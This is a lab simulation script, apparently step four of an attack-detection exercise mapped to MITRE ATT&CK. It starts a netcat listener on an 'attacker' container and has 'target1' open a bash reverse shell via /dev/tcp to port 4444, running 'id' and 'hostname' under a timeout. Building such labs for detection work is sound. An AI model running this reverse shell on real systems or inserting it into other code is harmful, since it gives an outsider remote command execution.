#!/usr/bin/env bash
# LAB ONLY. Simulates a bash reverse shell. The attacker listens with nc on 4444 and sends
# a couple of commands. target1 runs `bash -i >& /dev/tcp/attacker/4444 0>&1` in the
# background under `timeout`, so it always ends. REVSHELL_TIMEOUT sets the lifetime
# (default 180s, so there is time to kill it from the dashboard).
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/_lib.sh"

T="${REVSHELL_TIMEOUT:-180}"

banner "04 Reverse shell" \
  "target1 runs bash -i >& /dev/tcp/attacker/4444 0>&1 in the background (timeout ${T}s)" \
  "T1059.004 Execution: Command and Scripting Interpreter: Unix Shell; T1571 Command and Control: Non-Standard Port"

require_up attacker target1

# Stop any listener left from a previous run, then start a fresh one.
run_in attacker sh -c "pkill -f '[n]c -l -p 4444' 2>/dev/null || true"
bg_in attacker sh -c "(sleep 8; printf 'id\nhostname\n'; sleep 4) | timeout $((T + 15)) nc -l -p 4444 > /tmp/aegis-revshell.txt 2>&1"
sleep 2

echo "[target1] connecting back to attacker:4444 (timeout ${T}s)"
bg_in target1 bash -c "timeout ${T} bash -i >& /dev/tcp/attacker/4444 0>&1"

echo "Waiting for the listener to receive output ..."
sleep 15
echo "--- received on attacker ---"
run_in attacker cat /tmp/aegis-revshell.txt || true

echo "Done. The reverse shell is alive for ${T}s. Use cleanup.sh to kill it early."
